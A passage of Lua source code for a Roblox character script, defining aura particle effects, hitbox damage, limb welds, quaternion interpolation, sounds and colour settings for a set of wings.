			scEfWeld.C0 = sewco*AFrame(0,0,0,2*sine,0,0)
			--local heck = ({top=1,mid=0,bot=-1})
			scwW[1].C0 = pcwC0[1]*AFrame(0,0,sin(sine/32)/10+0.1,0,sin(sine/32)*12,0)
			scwW[2].C0 = pcwC0[2]*AFrame(0,0,sin(sine/32)/5+0.3,0,0,0)
			scwW[3].C0 = pcwC0[3]*AFrame(0,0,sin(sine/32)/10+0.1,0,sin(sine/32)*(-12),0)
		end
		sine += 1
	end
end

function module.FunniAruas(swait,Char,Arua)
	local sine = 0
	while swait() do
		swait()
		local RootPart = Char:FindFirstChild("HumanoidRootPart")
		if RootPart.Parent ~= nil then
			local C1,C2,C3,C4 = Arua.C1.Value,Arua.C2.Value,Arua.C3.Value,Arua.C4.Value
			local hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Char)
			local hitfloor2,posfloor2=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,9999,Char)
			if Arua.Value == "1" then
				module.weirdeff(swait,"weirdwaves",{
					Color=C1,
					Size=Vector3.new(0,0.1,0),
					CFrame=CFrame.new(posfloor2)*cf(0,0.1,0)*rang(0,0+sine,0),
					Material="Neon",
					Transparency = 0,
				},{
					Color=C2,
					Size=Vector3.new(50,0.1,50),
					CFrame=CFrame.new(posfloor2)*rang(0,180+sine,0),
					Transparency = 1,
				},30/60,'Quad',"Out")
				local pos = CFrame.new(RootPart.Position)*CFrame.new(math.random(-25,25),math.random(-2,10),math.random(-25,25))
				module.weirdeff(swait,"3DStar",{
					Color=C1,
					Size=Vector3.new(1,1,1),
					CFrame=pos,
					Material="Neon",
					Transparency = 0,
				},{
					Color=C2,
					Size=Vector3.new(0,0,0),
					CFrame=pos*CFrame.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)),
					Transparency = 1,
				},5,'Elastic',"Out")
			elseif Arua.Value == "Autumn" then
				if math.random(1,16) == 1 then
					local DaCFrame = Char.Torso.CFrame*CFrame.new(math.random(-15,15),math.random(10,15),math.random(-15,15))
					module.EpicEffect(swait,{
						Life = math.random(360,420),
						Type = "Leaf",
						Size1 = Vector3.new(1,0.5,2),
						Size2 = Vector3.new(1,0.5,2),
						Transparency2 = 1,
						Color1 = "C2",
						Pos1 = DaCFrame,
						Pos2 = DaCFrame*CFrame.new(math.random(-2,2),-20,math.random(-2,2)).p,
						RotationX = math.random(-2,2),
						RotationY = math.random(-2,2),
						RotationZ = math.random(-2,2),
					},C1,C2,C3,C4)
				end
				local DaCFrame = CFrame.new(posfloor2)*CFrame.new(math.random(-5,5),0,math.random(-5,5))
				module.EpicEffect(swait,{
					Life = 25,
					Type = "Sphere",
					Size1 = Vector3.new(0.25,0.25,0.25),
					Size2 = Vector3.new(0.025,0.025,0.025),
					Transparency1 = 0,
					Transparency2 = 1,
					Color1 = "C2",
					Color2 = false,
					UpdateColors = false,
					Meterial = "Neon",
					Pos1 = DaCFrame,
					Pos2 = DaCFrame*CFrame.new(math.random(-15,15),math.random(5,10),math.random(-15,15)).p,
					RotationX = 0,
					RotationY = 0,
					RotationZ = 0,
				},C1,C2,C3,C4)
			elseif Arua.Value == "Lost" then
				if math.random(1,12) == 1 then
					local DaCFrame = Char.Torso.CFrame*CFrame.new(math.random(-25,25),math.random(-2,15),math.random(-25,25))
					module.EpicEffect(swait,{
						Life = math.random(360,420),
						Type = "Sphere",
						Size1 = Vector3.new(0.1,0.1,0.1),
						Size2 = Vector3.new(2,2,2),
						Transparency1 = 0,
						Transparency2 = 1,
						Color1 = "C1",
						Color2 = C3,
						UpdateColors = true,
						Pos1 = DaCFrame,
						Pos2 = DaCFrame*CFrame.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)).p,
						RotationX = math.random(-2,2),
						RotationY = math.random(-2,2),
						RotationZ = math.random(-2,2),
						UseLight = true,
						Brightness1 = 1,
						Brightness2 = 0,
						Range = 25,
						LightColor = "PartColor",
						LightShadows = true,
					},C1,C2,C3,C4)
				end
			end
			sine = sine + 1
		else
			return
		end
	end
end

print("loaded module")


end
local module = {step=0,playerstuff={},}

if not workspace:FindFirstChild("Whatever") then
	Instance.new("RemoteEvent",workspace).Name = "Whatever"
end
Whatever = workspace.Whatever

cf,ang,angles,rad,sin,cos,rand,v3  = CFrame.new, CFrame.Angles,CFrame.Angles, math.rad, math.sin, math.cos, math.random, Vector3.new
NS,NSK,CS,CSK,NR,rgb,hsv = NumberSequence.new, NumberSequenceKeypoint.new, ColorSequence.new, ColorSequenceKeypoint.new, NumberRange.new, Color3.fromRGB, Color3.fromHSV

local debugmode = false
local RootCF=CFrame.fromEulerAnglesXYZ(-1.57,0,3.14)

-- artificial hb
ArtificialHB = Instance.new("BindableEvent", script)
ArtificialHB.Name = "Heartbeat"

script:WaitForChild("Heartbeat")

tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
frame = 1/60
ArtificialHB:Fire()

game:GetService("RunService").Heartbeat:Connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.Heartbeat:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				ArtificialHB:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)
-- end that

local effectsFolder
if not workspace:FindFirstChild("Effects") then
	effectsFolder = Instance.new("Folder",workspace)
	effectsFolder.Name = "Effects"
else
	effectsFolder = workspace:FindFirstChild("Effects")
end

local hitboxFolder
if not workspace:FindFirstChild("Hitboxes") then
	hitboxFolder = Instance.new("Folder",workspace)
	hitboxFolder.Name = "Hitboxes"
else
	hitboxFolder = workspace:FindFirstChild("Hitboxes")
end

local ignorelist = {effectsFolder,hitboxFolder}

function module.rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
	local ign = ignorelist
	table.insert(ign,Ignore)
	for i,v in pairs(game.Players:GetPlayers()) do
		table.insert(ign,v.Character)
	end
	return workspace:FindPartOnRayWithIgnoreList(Ray.new(Pos, Dir.unit * (Max or 999.999)), ign) 
end 

function module.rsign()
	return rand(1,2)*2 - 3
end

function module.rang(x,y,z)
	return ang(rad(x or 0),rad(y or 0),rad(z or 0))
end

function module.randr(maxX,maxY,maxZ)
	return module.rang(rand(-(maxX or 360),(maxX or 360)),rand(-(maxY or 360),(maxY or 360)),rand(-(maxZ or 360),(maxZ or 360)))
end

function module.glowify(c,ret)
	local e = rgb((c.R*65)^2,(c.G*65)^2,(c.B*65)^2)
	return (ret or Color3.new)(e.R,e.G,e.B)
end

function module.PART(p)
	local e = Instance.new("Part")
	e.Anchored = true
	e.CanCollide = false
	e.Transparency = 1
	e.Size = Vector3.new()
	e.Material = "Neon"
	e.Color = rgb(0,0,0)
	e.Massless = true
	e.Parent = p
	return e
end

function module.TRAIL(p,s)
	local a1 = Instance.new("Attachment",p)
	local a2 = Instance.new("Attachment",p)
	a1.Position = Vector3.new(0,(s or 1)/2,0)
	a2.Position = Vector3.new(0,-(s or 1)/2,0)
	local e = Instance.new("Trail")
	e.WidthScale = NS({NSK(0,1,0),NSK(1,0,0)})
	e.LightEmission = 1
	e.Attachment0 = a1
	e.Attachment1 = a2
	e.FaceCamera = true
	e.Transparency = NS({NSK(0,0,0),NSK(1,1,0)})
	e.Lifetime = 0.3
	e.Parent = p
	return e,a1,a2
end

function module.sound(p,id,pitch,vol,loop)
	local s = Instance.new("Sound")
	s.SoundId = "rbxassetid://" .. id
	s.Volume = (vol or 1)
	s.EmitterSize = 20*(vol or 1)
	s.Looped = loop or false
	s.PlaybackSpeed = pitch or 1
	local kill = false
	if typeof(p) == typeof(CFrame.new()) then
		kill = true
		local pe = Instance.new("Part")
		pe.CFrame = p
		pe.Anchored = true
		pe.CanCollide = false
		pe.Size = Vector3.new()
		pe.Transparency = 1
		pe.Parent = workspace["Effects"]
		p = pe
	end
	s.Parent = p
	game:GetService("Debris"):AddItem(s,10)
	s:Play()
	if not loop then
		s.Ended:connect(function()
			s:Destroy()
			if kill then
				p:Destroy()
			end
		end)
	end
	return s
end

function module.RTweenAnimate(object,Aniim,time,easingstyle,easingdirection,repet,reverse,deelay,disablebypass)
	Whatever:FireAllClients("RTweenAnimate",object,Aniim,time,easingstyle,easingdirection,repet,reverse,deelay)
end

function module.weirdeff(name,startprop,startprop1,endprop,endprop1,timer,easing,easing2,repet,reverse,del,deb,server,marazm)
	Whatever:FireAllClients("weirdeff",name,startprop,startprop1,endprop,endprop1,timer,easing,easing2,repet,reverse,del,deb,marazm)
end

function module.weldedweirdeff(name,part,parenttopart,wstartc0,startprop,startprop1,wendc0,endprop,endprop1,timer,easing,easing2,repet,reverse,del,deb,server,marazm)
	if not server then
		Whatever:FireAllClients("weldedweirdeff",name,part,parenttopart,wstartc0,startprop,startprop1,wendc0,endprop,endprop1,timer,easing,easing2,repet,reverse,del,deb,false)
	else
		-- im doing this when i actually need it
	end
end

function module.particle(pos,num,props,attPos)
	local part = pos
	if typeof(pos) == typeof(CFrame.new()) then
		part = Instance.new("Part")
		part.Anchored = true
		part.CFrame = pos
		part.Transparency = 1
		part.CanCollide = false
		part.Parent = workspace:FindFirstChild("Effects") or workspace
	end
	local at = Instance.new("Attachment",part)
	at.Position = attPos or Vector3.new(0,0,0)
	local eff = Instance.new("ParticleEmitter",at)
	eff.Enabled = false
	eff.Speed = NumberRange.new(0)
	for i,v in pairs(props) do
		eff[i] = v
	end
	if num ~= 0 then
		coroutine.resume(coroutine.create(function()
			eff:Emit(num)
			wait(10)
			eff:Destroy()
			if typeof(pos) == typeof(CFrame.new()) then
				part:Destroy()
			end
		end))
	else
		coroutine.resume(coroutine.create(function()
			eff.Enabled = true
			repeat module.swait(60) until not eff.Parent
			if typeof(pos) == typeof(CFrame.new()) then
				part:Destroy()
			end
		end))
	end
	return eff
end

function module.slashy(cfr,color,sizex,sizey,spins,spinspeeds,wahoo)
	Whatever:FireAllClients("slashy",cfr,color,sizex,sizey,spins,spinspeeds,wahoo)
end

function module.weldedslashy(part,sc0,color,sizex,sizey,spins,spinspeeds,wahoo)
	Whatever:FireAllClients("weldedslashy",part,sc0,color,sizex,sizey,spins,spinspeeds,wahoo)
end

waiter = ArtificialHB.Event
function module.swait(num) for i = 0, num or 0 do waiter:wait() end return true end
local swait = module.swait -- alias

coroutine.resume(coroutine.create(function()
	while swait() do
		module.step += 1
	end
end))

function weldnt(root,eroot)
	while eroot do
		local it = eroot:FindFirstChildOfClass("Weld")
		print("removed weld")
		if it then it.Enabled = false it.Part0 = nil it.Part1 = nil it.Parent = nil else break end
	end
end

function module.CreateWeld(parent,part0,part1,C0,C1,class)
	local weld = Instance.new(class or "Motor6D")
	weld.Part0 = part0
	weld.Part1 = part1
	weld.C1 = C1 or CFrame.new()
	weld.C0 = C0 or CFrame.new()
	weld.Parent = parent
	return weld
end
CreateWeld = module.CreateWeld

function positioner(root,eroot,ehum,cfe)
	weldnt(root,eroot)
	if ehum.Health > 0 then
		print("added weld")
		game:GetService("Debris"):AddItem(CreateWeld(eroot,root,eroot,cfe*CFrame.Angles(0,math.rad(180),0),nil,"Weld"),.75)
		print(eroot["Root Hip"].C0)
	end
end

function module.makeHitbox(char,root,hitbProps,dam,multihit,startactive,critchance,hitfunc)
	--if true then return Instance.new("Part") end
	local exclude = {}
	local e = Instance.new("Part")
	local function check(v)
		if v.Name ~= "HumanoidRootPart" and v.Name ~= "Torso" and v.Name ~= "Head" and v.Name ~= "Left Leg" and v.Name ~= "Left Arm" and v.Name ~= "Right Leg" and v.Name ~= "Right Arm" then return end
		if v.Parent == char or v.Parent == nil then return end
		if v.Name ~= "hitboxe" then
			local enem = v.Parent
			if enem:IsA("Model") then
				local eroot = enem:FindFirstChild("HumanoidRootPart")
				local ehum = enem:FindFirstChildOfClass("Humanoid")
				local etors = enem:FindFirstChild("Head")
				if ehum and etors and ehum.Health > 0 then
					for f,h in pairs(exclude) do
						if h == ehum then
							return
						end
					end
					--dam = (dam * stats["ATK"]) + stats["ADMG"]
					--ehum.BreakJointsOnDeath = false
					if not multihit then table.insert(exclude,ehum) end
					if ehum.Health - dam > 0 then 
						ehum:TakeDamage(dam)
						if eroot then
							weldnt(root,eroot)
							if eroot then
								if hitfunc then
									hitfunc(e,eroot,ehum,etors)
								end
							end
						end
					end
				end
			end
		end
	end
	e.Anchored = true
	e.Transparency = 1
	if debugmode then e.Transparency = .8 end
	e.CanCollide = false
	e.Material = "Neon"
	e.Massless = true
	e.Name = (char or {Name="a nonexistent entity"}).Name
	local egg = startactive
	if startactive then
		e.Color = Color3.new(1,0,0)
	else
		e.Color = Color3.new(0,1,0)
	end
	for i,v in pairs(hitbProps) do
		e[i] = v
	end
	local hitPlayers = Instance.new("Folder",e)
	hitPlayers.Name = "hitPlayers"
	e.Parent = hitboxFolder
	if egg then
		for i,v in pairs(e:GetTouchingParts()) do
			check(v)
		end
	end
	local ev1 = e.Changed:connect(function(prop)
		if prop == "Color" then
			if e.Color == Color3.new(1,0,0) then
				egg = true
				for i,v in pairs(e:GetTouchingParts()) do
					check(v)
					if e.Color == Color3.new(0,1,0) then break end
				end
			elseif e.Color == Color3.new(0,0,1) then
				if egg then
					for i,v in pairs(e:GetTouchingParts()) do
						check(v)
						if e.Color == Color3.new(0,1,0) then break end
					end
				end
				e:Destroy()
			end
		end
	end)
	e.Touched:connect(function() end) -- GetTouchingParts() fuel
	coroutine.resume(coroutine.create(function()
		repeat 
			for i,h in pairs(e:GetTouchingParts()) do
				check(h)
			end
			swait() 
		until e.Parent == nil
		ev1:Disconnect()
		return
	end))
	return e
end


coroutine.wrap(stupidAnimThing)()
--animThing = require(notReplicatedFirst.stupidAnimThing) -- critical for animations and effects 

local swait,CreateWeld,rayCast,rang,rsign,randr,glowify,PART,TRAIL,sound = module.swait,module.CreateWeld,module.rayCast,module.rang,module.rsign,module.randr,module.glowify,module.PART,module.TRAIL,module.sound

local RTweenAnimate,particle,weirdeff,weldedweirdeff,slashy,weldedslashy,EpicEffect = module.RTweenAnimate,module.particle,module.weirdeff,module.weldedweirdeff,module.slashy,module.weldedslashy,module.EpicEffect

function makeHitbox(hitbProps,dam,multihit,startactive,critchance,hitfunc)
	local hb = main.makeHitbox(char,root,hitbProps,dam,multihit,startactive,critchance,hitfunc)
	return hb
end

-- end setup

-- Humanoid Stuff, Mainly Defining the player and what a CFram is. -- //

rad = math.rad;
cos = math.cos;
sin = math.sin;
tan = math.tan;
pi = math.pi;
cosh = math.cosh;
sinh = math.sinh;
local LerpFactor, Alpha = .1
sine = 0
change = 1

-- moai aliases
cf,ang,angles,rad,rand,v3,rgb,hsv  = CFrame.new, CFrame.Angles,CFrame.Angles, math.rad, math.random, Vector3.new, Color3.fromRGB, Color3.fromHSV
NS,NSK,CS,CSK,NR = NumberSequence.new, NumberSequenceKeypoint.new, ColorSequence.new, ColorSequenceKeypoint.new, NumberRange.new

-- Main Script Variables --
Side = 1
Mode = 1
SubMode = nil
IdleAnim = 1
aura = 0
local C1,C2,C3,C4 = rgb(35, 14, 57),rgb(60, 86, 170),rgb(108, 164, 176),rgb(255,255,0)
Aura = Instance.new("StringValue")
Aura.Parent = script
C1 = Instance.new("Color3Value")
C1.Parent = Aura
C1.Value =Color3.fromRGB(166, 166, 166)
C2 = Instance.new("Color3Value")
C2.Parent = Aura
C2.Value = Color3.fromRGB(166, 166, 166)
C3 = Instance.new("Color3Value")
C3.Parent = Aura
C3.Value = Color3.fromRGB(166, 166, 166)
C4 = Instance.new("Color3Value")
C4.Parent = Aura
C4.Value = Color3.fromRGB(166, 166, 166)
color3values = {C1,C2,C3,C4}
color3values[1].Value = C1.Value
color3values[2].Value = C2.Value
color3values[3].Value = C3.Value
color3values[4].Value = C4.Value
StoredHumWalkSpeed = 16
StoredHumJumpPower = 50

-- Ceasing Animate -- // (use :FindFirstChildOfClass() so it does not brake :P)
if char:FindFirstChild("Animate") then
	char.Animate:Destroy()
end
if char:FindFirstChild("Health") then
	char.Health:Destroy()
end
if Hum:FindFirstChild("Animator") then
	Hum.Animator:Destroy()
end
-- Animate has now Ceased -- //

-- Limb Setup. --
local Torso = char.Torso
local rarm = char["Right Arm"]
local larm = char["Left Arm"]
local lleg = char["Left Leg"]
local rleg = char["Right Leg"]
ra = char["Right Arm"]
la = char["Left Arm"]
rl = char["Right Leg"]
ll = char["Left Leg"]
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
RW, LW=Instance.new("Motor6D"), Instance.new("Motor6D") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
hed = char.Head

-- CFrame Functions
function QuaternionFromCFrame(cf) 
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
	local trace = m00 + m11 + m22 
	if trace > 0 then 
		local s = math.sqrt(1 + trace) 
		local recip = 0.5/s 
		return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
	else 
		local i = 0 
		if m11 > m00 then
			i = 1
		end
		if m22 > (i == 0 and m00 or m11) then 
			i = 2 
		end 
		if i == 0 then 
			local s = math.sqrt(m00-m11-m22+1) 
			local recip = 0.5/s 
			return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
		elseif i == 1 then 
			local s = math.sqrt(m11-m22-m00+1) 
			local recip = 0.5/s 
			return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
		elseif i == 2 then 
			local s = math.sqrt(m22-m00-m11+1) 
			local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
		end 
	end 
end

function QuaternionToCFrame(px, py, pz, x, y, z, w) 
	local xs, ys, zs = x + x, y + y, z + z 
	local wx, wy, wz = w*xs, w*ys, w*zs 
	local xx = x*xs 
	local xy = x*ys 
	local xz = x*zs 
	local yy = y*ys 
	local yz = y*zs 
	local zz = z*zs 
	return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end

function QuaternionSlerp(a, b, t) 
	local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
	local startInterp, finishInterp; 
	if cosTheta >= 0.0001 then 
		if (1 - cosTheta) > 0.0001 then 
			local theta = math.acos(cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((1-t)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta  
		else 
			startInterp = 1-t 
			finishInterp = t 
		end 
	else 
		if (1+cosTheta) > 0.0001 then 
			local theta = math.acos(-cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((t-1)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta 
		else 
			startInterp = t-1 
			finishInterp = t 
		end 
	end 
	return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function TagChange(JapName,LatName,Color1,Color2)
	local Gui = hed.ChromosphericHeadGui
	Gui.JapLabel.Text = "ã"..JapName.."ã"
	Gui.LatLabel.Text = "ã"..LatName.."ã"
	Gui.BottomDiv1.BackgroundColor3,Gui.BottomDiv2.BackgroundColor3,Gui.MidDivL.BackgroundColor3,Gui.MidDivR.BackgroundColor3 = Color1,Color1,Color1,Color1
	Gui.TopDiv1.BackgroundColor3 = Color2
	for i,v in pairs(Gui:GetDescendants()) do if v.Name == "JapLabel" or v.Name == "LatLabel" then
			v.TextColor3 = Color2 v.TextStrokeColor3 = Color1
		end
	end
	Gui.ScriptLabel.TextColor3 = Color1 Gui.ScriptLabel.TextStrokeColor3 = Color2
end

function NewSong(ID,Volume,TimePosition,PlaybackSpeed)
	ChromoAudio.SoundId = "rbxassetid://"..ID
	ChromoAudio.Volume = Volume
	ChromoAudio.TimePosition = TimePosition
	ChromoAudio.PlaybackSpeed = PlaybackSpeed
end

function clerp(a,b,t) 
	local qa = {QuaternionFromCFrame(a)}
	local qb = {QuaternionFromCFrame(b)} 
	local ax, ay, az = a.x, a.y, a.z 
	local bx, by, bz = b.x, b.y, b.z
	local _t = 1-t
	return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 

euler = CFrame.fromEulerAnglesXYZ
cf = CFrame.new
angles = CFrame.Angles
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=char.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
player=Player 
ch=char
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 

-- CFrame End --

-- Guns's funni Sound Function
function Sound(Type,SoundId,parent,vol,pitch,timepos,SCFrame)
	local EFXFolder = workspace:FindFirstChild("Effects") or workspace
	coroutine.resume(coroutine.create(function()
		if Type == "Sound" then
			local sound = Instance.new("Sound",parent)
			sound.SoundId = "rbxassetid://" .. SoundId
			sound.Volume = vol
			sound.PlaybackSpeed = pitch
			sound.TimePosition = timepos
			sound:Play()
			wait(5 + sound.TimeLength)
			if sound.Parent ~= nil then
				sound:Destroy()
			end
		elseif Type == "LongSound" then
			local SoundPart = Instance.new("Part",EFXFolder)
			SoundPart.Anchored = true
			SoundPart.CanCollide = false
			SoundPart.Size = Vector3.new(0.05,0.05,0.05)
			SoundPart.Transparency = 1
			SoundPart.CFrame = parent.CFrame
			local sound = Instance.new("Sound",SoundPart)
			sound.SoundId = "rbxassetid://" .. SoundId
			sound.Volume = vol
			sound.PlaybackSpeed = pitch
			sound.TimePosition = timepos
			sound:Play()
			coroutine.resume(coroutine.create(function()
				repeat  
					swait(5)
					SoundPart.CFrame = parent.CFrame
				until parent.parent == nil or SoundPart.Parent == nil
			end))
			wait(30 + sound.TimeLength)
			if SoundPart.Parent ~= nil then
				SoundPart:Destroy()
			end
		elseif Type == "CFrameSound" then
			local SoundPart = Instance.new("Part",EFXFolder)
			SoundPart.Anchored = true
			SoundPart.CanCollide = false
			SoundPart.Size = Vector3.new(0.05,0.05,0.05)
			SoundPart.Transparency = 1
			SoundPart.CFrame = SCFrame
			local sound = Instance.new("Sound",SoundPart)
			sound.SoundId = "rbxassetid://" .. SoundId
			sound.Volume = vol
			sound.PlaybackSpeed = pitch
			sound.TimePosition = timepos
			sound:Play()
			wait(30 + sound.TimeLength)
			if SoundPart.Parent ~= nil then
				SoundPart:Destroy()
			end
		end
	end))
end


--script:WaitForChild("Resources",2):Destroy() --Why is this here?

ChromoAudio = Instance.new('Sound',Torso)
ChromoAudio.SoundId,ChromoAudio.Playing,ChromoAudio.Looped,ChromoAudio.Volume,ChromoAudio.PlaybackSpeed = "rbxassetid://5711318595",true,true,1,1
ChromoAudio.Parent = Player.PlayerGui


Light1 = Instance.new('PointLight',rleg.RightFootAttachment)Light1.Color = Color3.fromRGB(60, 86, 170) Light1.Range = 25 Light1.Brightness = 1
Light2 = Instance.new('PointLight',lleg.LeftFootAttachment) Light2.Color = Color3.fromRGB(60, 86, 170) Light2.Range = 25 Light2.Brightness = 1

-- Tween Values. --
function TweenAnimate(object,Aniim,time,easingstyle,easingdirection,repet,reverse,deelay)
	local infos=TweenInfo.new(time,Enum.EasingStyle[easingstyle],Enum.EasingDirection[easingdirection],repet,reverse,deelay)
	local tween=game:GetService("TweenService"):Create(object,infos,Aniim)
	tween:Play()
	return tween
end
-- Tween Values. --

-- beginning of everything else

local Lightin_N_Stuff
local LightingMain
if Player.PlayerGui:FindFirstChild("Lighting") then
	Lightin_N_Stuff = Player.PlayerGui:FindFirstChild("Lighting")
--	LightingMain = Lightin_N_Stuff.LightingMain:Destroy()
	--LightingMain = script.LightingMain
	--LightingMain.Parent = Lightin_N_Stuff
	--LightingMain.Disabled = false
else
	Lightin_N_Stuff = Instance.new("ScreenGui",Player.PlayerGui)
	Lightin_N_Stuff.Name = "Lighting"
	Lightin_N_Stuff.ResetOnSpawn = false
	--LightingMain = script.LightingMain
	--LightingMain.Parent = Lightin_N_Stuff
	---LightingMain.Disabled = false
end


function CreateWeld(parent,part0,part1,C0,C1)
	local weld = Instance.new("Motor6D")
	weld.Part0 = part0
	weld.Part1 = part1
	weld.C1 = C1 or CFrame.new()
	weld.C0 = C0 or CFrame.new()
	weld.Parent = parent
	return weld
end

-- WINGS
handlex = Instance.new("Part")
handlex.Transparency = 1
handlex.Anchored = false
handlex.Size = Vector3.new()
handlex.CanCollide = false
handlex.Massless = true
handlex.Parent = root

handle = handlex:Clone()
CreateWeld(Torso,Torso,handlex,CFrame.new(0,2,2))
handle.Parent = handlex
CreateWeld(handlex,handlex,handle,CFrame.new(0,0,0))

wings = {cores={},lwings={},rwings={},corewelds={},lwingwelds={},rwingwelds={},miniweldsl={},miniweldsr={}}

function makeWings(numwl,numwr) --alright, so wings one and wings right? what?
    local function setupWing(side)
	--[[	side = side or "l"
		--local w = resources["CHROMOSPHERIC"]:Clone()
		table.insert(wings[side.."wings"],w)
		local weld = CreateWeld(handle,handle,w)
		table.insert(wings[side.."wingwelds"],weld)
		for i,v in pairs(w["miniglitcher"]:GetDescendants()) do
			if ({bot=true,mid=true,top=true})[v.Name] then
				table.insert(wings["miniwelds" .. (v.Parent.Name:sub(1,1))],CreateWeld(v,w.miniglitcher.core,v))
			end
		end
		w.Parent = handle
		for i,v in pairs(w:GetDescendants()) do
			pcall(function()
				v.Anchored = false
				v.UsePartColor = true
				v.Massless = true
				v.CanCollide = false
			end)
		end]]
	end
	wings = {cores={},lwings={},rwings={},corewelds={},lwingwelds={},rwingwelds={},miniweldsl={},miniweldsr={}}
	handle:ClearAllChildren()
	for i = 1,numwl do
		setupWing("l")
	end
	for i = 1,numwr do
		setupWing("r")
	end
end

local MaxWings = 8
makeWings(MaxWings,MaxWings)

function shW(w,t)
	local num = (t and 0) or 1 --Convert to a transparency value
	for i, v in pairs(w:GetDescendants()) do
		if not ({top=true,bot=true,mid=true,main=true,PE=true})[v.Name] and v:IsA("BasePart") then

			v.Transparency = num
		end
	end
	w.main.Attachment.ParticleEmitter.Enabled = t
	w.main.PE.ParticleEmitter.Enabled = t
	w.main.PointLight.Enabled = t
end

--local WAnimV = script.WAnim

shownLeft = MaxWings
shownRight = MaxWings
function showWings(numwl,numwr) --PLEASE
	shownLeft = numwl
	shownRight = numwr
	--WAnimV.shownLeft.Value = numwl
	--WAnimV.shownRight.Value = numwr
	for i = 1, MaxWings do
		if i <= numwl then
			shW(wings["lwings"][i],true)
		else
			shW(wings["lwings"][i],false)
		end
		if i <= numwr then
			shW(wings["rwings"][i],true)
		else
			shW(wings["rwings"][i],false)
		end
	end
end

showWings(3,3)

function Recolor(MainLWingColor,SecondLWingColor,MainSmolLWingColor,SecondSmolLWingColor,MainRWingColor,SecondRWingColor,MainSmolRWingColor,SecondSmolRWingColor,RLightColor,LLightColor)
	local RLC = (RLightColor or MainRWingColor)
	Light1.Color = RLC
	Light2.Color = RLC
	local LLC = (LLightColor or MainLWingColor)
	for i,v in pairs(wings["lwings"]) do
		v.cl1.Color = MainLWingColor
		v.cl2.Color = SecondLWingColor
		v.cl2ext.Color = SecondLWingColor
		v.miniglitcher.core.Color = MainSmolLWingColor
		v.miniglitcher.right.bot.Union.Color = MainSmolLWingColor
		v.miniglitcher.right.mid.Union.Color = MainSmolLWingColor
		v.miniglitcher.right.top.Union.Color = MainSmolLWingColor
		v.miniglitcher.left.bot.Union.Color = SecondSmolLWingColor
		v.miniglitcher.left.mid.Union.Color = SecondSmolLWingColor
		v.miniglitcher.left.top.Union.Color = SecondSmolLWingColor
		v.main.PointLight.Color = LLC
		v.main.Attachment.ParticleEmitter.Color = ColorSequence.new(MainLWingColor)
		v.main.PE.ParticleEmitter.Color = ColorSequence.new(MainLWingColor)
	end
	for i,v in pairs(wings["rwings"]) do
		v.cl1.Color = MainRWingColor
		v.cl2.Color = SecondRWingColor
		v.cl2ext.Color = SecondRWingColor
		v.miniglitcher.core.Color = MainSmolRWingColor
		v.miniglitcher.right.bot.Union.Color = SecondSmolRWingColor
		v.miniglitcher.right.mid.Union.Color = SecondSmolRWingColor
		v.miniglitcher.right.top.Union.Color = SecondSmolRWingColor
		v.miniglitcher.left.bot.Union.Color = MainSmolRWingColor
		v.miniglitcher.left.mid.Union.Color = MainSmolRWingColor
		v.miniglitcher.left.top.Union.Color = MainSmolRWingColor
